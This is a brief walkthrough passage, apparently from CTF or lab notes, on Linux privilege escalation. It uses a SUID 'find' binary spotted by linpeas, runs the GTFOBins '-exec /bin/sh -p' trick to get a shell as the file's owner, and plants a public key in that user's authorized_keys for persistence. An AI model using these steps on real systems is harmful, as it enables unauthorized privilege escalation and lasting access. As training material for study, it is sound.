Look for any files (highlighted in Orange)

In the below example we have (scripts/find):
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strace Not Found
-rwsr-sr-x 1 nightfall nightfall 309K Aug 28  2019 /scripts/find
```

Here we can check out GTFOBins for the find command (SUID). run:
```
cd /scripts
./find . -exec /bin/sh -p \; -quit
```

This should give you a new shell.
run:
```
id
```

You should some something like this:
```
uid=1001(matt) gid=1001(matt) euid=1000(nightfall) egid=1000(nightfall) groups=1000(nightfall),1001(matt)
```

Notice the euid, egid and groups.

You should be able to cd to the home directory of the user (e.g.: nightfall) and create a .ssh folder and copy you public key tio the authorized_key file.

Check out "Tool Usage > SSH > Public & Private Keys"
